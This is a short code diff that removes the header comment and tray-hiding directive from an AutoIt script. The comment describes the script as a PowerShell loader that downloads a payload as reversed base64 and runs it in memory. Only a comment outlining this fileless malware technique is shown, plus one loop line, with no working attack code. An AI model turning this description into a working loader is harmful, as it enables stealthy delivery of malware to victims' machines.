@@ -1,15 +1,3 @@
-#cs ----------------------------------------------------------------------------
-
- AutoIt Version: 3.3.14.5
- Author:         NYAN CAT
-
- Script Function:
-	AutiIt PowerShell Loader
-	[*]Download payload as reversed base64
-	[*]Run powershell command to load it in memory
-
-#ce ----------------------------------------------------------------------------
-#NoTrayIcon
 
 
 For $i = 30 To 1 Step -1
